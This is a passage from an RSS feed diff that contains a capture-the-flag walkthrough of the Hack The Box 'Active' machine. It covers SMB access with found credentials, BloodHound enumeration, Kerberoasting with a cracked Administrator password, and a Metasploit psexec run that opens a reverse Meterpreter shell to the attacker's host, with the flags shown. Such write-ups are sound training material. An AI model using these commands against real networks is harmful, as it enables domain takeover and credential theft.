+[+] User SMB session establishd on 10.10.10.100...
+[+] IP: 10.10.10.100:445	Name: active.htb                                        
+	Disk                                                  	Permissions
+	----                                                  	-----------
+	Users                                             	READ ONLY
+	.SVC_TGS\Desktop                                   
+	dr--r--r--                0 Sat Jul 21 11:14:42 2018	.
+	dr--r--r--                0 Sat Jul 21 11:14:42 2018	..
+	fr--r--r--               34 Sat Jul 21 11:14:42 2018	user.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;This can be fetched to get the user token for this machine: &lt;code class=&quot;highlighter-rouge&quot;&gt;smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100 -R Users -A user.txt -q&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;bloodhound&quot;&gt;BloodHound&lt;/h3&gt;
+
+&lt;p&gt;Some references on how to use BloodHound can be seen below.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;https://blog.cptjesus.com/posts/newbloodhoundingestor&lt;/li&gt;
+  &lt;li&gt;https://thenoobsway.com/active-directory-reconnaissance-using-bloodhound/&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Since we have low privilege credentials, we could authenticate via LDAP and &lt;code class=&quot;highlighter-rouge&quot;&gt;ad-ldap-enum&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapdomaindump&lt;/code&gt; to look for interesting information. However, BloodHound is a better tool for this proces. Since we can’t psexec due to  &lt;code class=&quot;highlighter-rouge&quot;&gt;svc_tgs&lt;/code&gt; being a service account, runas can been used to start a shell as a low priv user. The following command can be used: &lt;code class=&quot;highlighter-rouge&quot;&gt;runas /netonly /user:active.htb\svc_tgs cmd&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/htb/1.png&quot; alt=&quot;alt text&quot; title=&quot;1&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Once that is completed, The BloodHound C# Ingestor “SharpHound” can be used to enumerate LDAP and gather all domain information: &lt;code class=&quot;highlighter-rouge&quot;&gt;.\SharpHound.exe -c all -d active.htb --DomainController 10.10.10.100 --DnsServer 10.10.10.100&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/htb/2.png&quot; alt=&quot;alt text&quot; title=&quot;2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Importing the SharpHound results into BloodHound and by looking at the results, it looks like the administrator user is kerberoastable due to the user being configured with a SPN.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/htb/3.png&quot; alt=&quot;alt text&quot; title=&quot;3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Kerberoasting involves extracting a hash of the encrypted material from a Kerberos “Ticket Granting Service” ticket reply (TGS_REP), which can be subjected to offline cracking in order to retrieve the plaintext password. This is possible because the TGS_REP is encrypted using the NTLM password hash of the account in whose context the service instance is running.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/htb/4.png&quot; alt=&quot;alt text&quot; title=&quot;4&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Impacket’s GetUserSPNs.py script can be used to request the TGS of the administrator account and extract the hash of this for offline cracking. This can be achieved using Hashcat: &lt;code class=&quot;highlighter-rouge&quot;&gt;hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force --potfile-disable&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/htb/5.png&quot; alt=&quot;alt text&quot; title=&quot;5&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hashcat successfully cracked the hash using the rockyou.txt wordlist and the plaintext password of this hash can be seen below.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$373e34da642ae2f6fc55a66510e68ee7$9346f3dc8da4fa6b12e3fb663847fb755d729d12d55ca78f341056fd3d38845da008f17f0c08f35f13abd24bd51f4feb9febdcc1c2aa369f4c7d6ad42ce554570a45a933fdbc3f9d2f27be5c954cecd409863258da13af592cfa1765ab5b50fc566bcb4a68b1a00fce1a68d65b4d89a5ff93d1116744567370c052c1945dde973cbf610d5b257643fe4539b7f17d26b907aac87c9a4c493e8793c46eb6b1f8fdee32748261a17ecb6528ca343086109d515b731cc7cd020834df4bad5c47ff041995b4aaec1ca3a1063d47ceed63004ad25b824daff040539290567186632e7c611ee9a5519551d5968b077b944ee965d4de78927abe3bdfbd8b5d9061430904934d1fe44edf03100f63e64888a3268eb6c0ef66ef406dee14aa90ac0c8679ea7948ca2a9c5909aa054487be237017ad8dcf2c483bd750a35b67c813ef7998cde315d13d8429807c452dc865f134a2ba5a214f07594712f141a7f5af48d145e54d5e4c09d5942a29386f33a4773e3aa5dc3fa4fb271ee81e7daa3340339a44f2725a758cec4f7748727f7b018cab8dde4fbcefcbfab225d4ef910d863b6a4e37e039e0aff33825fd40be982e13946ee645ff72778fbe3c5fe10b695efb31bfca097afff3e1e0e8421fbd49334bab43017761293a2433b45aefc67f4abf809e0e3075b619f6b1e309924b6ae007632d9000c88038d547881787f5609398c810ca0a2d279a149df82759ddc59648a663ad8f764b45b915d170bf457f20e14a621f7ee4032bca48e9a0e2a2d6aa477e3e0375b7f4a2418aa0f6f5e06a2e2a307667eec40b6999fa6529a233f90092171ee09de00e6cc3b6f17f0a620c981bff474fed62d1f4211bce51fe28cae747ebaac12de512437aef20a05457051adec6ec65e649a570671360b107b3330b479af227910f9074f1abb26f7602a1821cff3b044c754909c8fbe164f69254bbcc8e6c2d026f9e973e364f7ad53b6b22c33a4fb1e8b7b8a5948133471172f9d4e01580b16105ee277a8136935f6be751753b1c8ea0bcd6b5d503884db5364b7485e4294935fc2129867b7918d17a56a4dacbda7f77f0dca04b1d6ccd0b5ded7f43f5721c9b22e37d07cea1c01caedf3a4324a7058452204baedf85d48cab02aeffc905aa054864fd128f2ca456d86ab0c97698df3fc3058233c95428d9c7ac54ed5aa603a4f21944576241f970ddd594d880372500bcffd677bde516ee75d18463dae717cef842de7bf7d9c03146:Ticketmaster1968
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: Kerberos 5 TGS-REP etype 23
+Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~4...c03146
+Time.Started.....: Thu Jul  4 19:55:19 2019 (27 secs)
+Time.Estimated...: Thu Jul  4 19:55:46 2019 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   394.9 kH/s (6.04ms) @ Accel:32 Loops:1 Thr:64 Vec:8
+Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
+Progress.........: 10539008/14344385 (73.47%)
+Rejected.........: 0/10539008 (0.00%)
+Restore.Point....: 10534912/14344385 (73.44%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: Tioncurtis23 -&amp;gt; Thelittlemermaid
+
+Started: Thu Jul  4 19:55:09 2019
+Stopped: Thu Jul  4 19:55:46 2019
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Using the password &lt;code class=&quot;highlighter-rouge&quot;&gt;Ticketmaster1968&lt;/code&gt;, psexec can be used to login to the system and get root.txt. &lt;code class=&quot;highlighter-rouge&quot;&gt;wmiexec&lt;/code&gt; from impacket and &lt;code class=&quot;highlighter-rouge&quot;&gt;pth-wmis&lt;/code&gt; can also be used instead of MetaSploit psexec.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 &amp;gt; use exploit/windows/smb/psexec
+msf5 exploit(windows/smb/psexec) &amp;gt; set RHOSTS 10.10.10.100
+RHOSTS =&amp;gt; 10.10.10.100
+msf5 exploit(windows/smb/psexec) &amp;gt; set SMBDomain active.htb
+SMBDomain =&amp;gt; active.htb
+msf5 exploit(windows/smb/psexec) &amp;gt; setg SMBUser Administrator
+SMBUser =&amp;gt; Administrator
+msf5 exploit(windows/smb/psexec) &amp;gt; setg SMBPass Ticketmaster1968
+SMBPass =&amp;gt; Ticketmaster1968
+msf5 exploit(windows/smb/psexec) &amp;gt; run
+
+[*] Started reverse TCP handler on 10.10.14.41:4444 
+[*] 10.10.10.100:445 - Connecting to the server...
+[*] 10.10.10.100:445 - Authenticating to 10.10.10.100:445|active.htb as user 'Administrator'...
+[*] 10.10.10.100:445 - Selecting PowerShell target
+[*] 10.10.10.100:445 - Executing the payload...
+[+] 10.10.10.100:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (179779 bytes) to 10.10.10.100
+[*] Meterpreter session 1 opened (10.10.14.41:4444 -&amp;gt; 10.10.10.100:57298) at 2019-07-04 20:15:59 -0400
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;The root hash can be found within the Administrator’s desktop.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\Administrator\Desktop&amp;gt;type root.txt
+type root.txt
+b5fc76d1d6b91d77b2fbf2d54d0f708b
+
+C:\Users\Administrator\Desktop&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>
+        <pubDate>Fri, 28 Dec 2018 09:00:00 +0000</pubDate>
+        <link>http://snoopysecurity.github.io/capture_the_flag/2018/12/28/htb-active-walkthrough.html</link>
+        <guid isPermaLink="true">http://snoopysecurity.github.io/capture_the_flag/2018/12/28/htb-active-walkthrough.html</guid>
+        
+        
+        <category>capture_the_flag</category>
         
       </item>
     
